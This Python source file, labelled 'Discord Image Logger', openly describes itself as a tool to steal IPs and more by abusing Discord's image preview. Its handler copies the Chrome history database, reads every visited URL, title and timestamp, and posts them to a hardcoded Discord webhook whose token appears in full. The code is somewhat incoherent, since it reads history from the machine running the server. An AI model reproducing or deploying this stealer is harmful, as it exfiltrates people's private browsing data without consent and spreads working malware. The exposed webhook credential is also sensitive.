import sqlite3
import os
import shutil
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1334861934742208543/5uBPJITGopxMiC_QEyk-P3mpwNM46VJRV7fC0k-WTXISRJVaUmn_JWpNVPTTyWx10yjJ",
    "image": "https://fileinfo.com/img/ss/xl/jpg_44-2.jpg",  # You can have a custom image URL
    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
    
    # More config options as needed...
}

def get_chrome_history():
    # Path to the Chrome history file (adjust path based on OS and user profile)
    user_profile = os.path.expanduser("~")
    if os.name == 'nt':  # For Windows
        history_db = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\History")
    elif os.name == 'posix':  # For macOS/Linux
        history_db = os.path.join(user_profile, "Library/Application Support/Google/Chrome/Default/History")
    else:
        return []

    # Ensure Chrome is not running before accessing the history database
    if os.path.exists(history_db):
        try:
            # Make a temporary copy of the database as Chrome locks it during runtime
            temp_history_db = "chrome_history_temp.db"
            shutil.copy2(history_db, temp_history_db)

            # Connect to the copied database
            conn = sqlite3.connect(temp_history_db)
            cursor = conn.cursor()

            # Query the history table for URLs and visit times
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            history = cursor.fetchall()

            conn.close()
            os.remove(temp_history_db)  # Clean up the temporary database

            return history
        except Exception as e:
            print(f"Error retrieving Chrome history: {e}")
            return []
    else:
        return []

def report_chrome_history(history):
    # Create a formatted message with the collected history
    history_message = "\n".join([f"**URL:** {entry[0]}\n**Title:** {entry[1]}\n**Last Visit Time:** {entry[2]}" for entry in history])

    # Send the history data to the Discord webhook
    requests.post(config["webhook"], json={
        "username": "Chrome History Logger",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Collected Chrome History",
                "color": 0x00FFFF,
                "description": f"Here is the collected Chrome history:\n\n{history_message}",
            }
        ],
    })

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Check if a URL argument was passed for custom image URL
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]
            
            # Collect Chrome history
            history = get_chrome_history()
            if history:
                report_chrome_history(history)

            # Proceed with the normal behavior (image logging, etc.)
            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            print(f"Error: {str(e)}")

        return

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
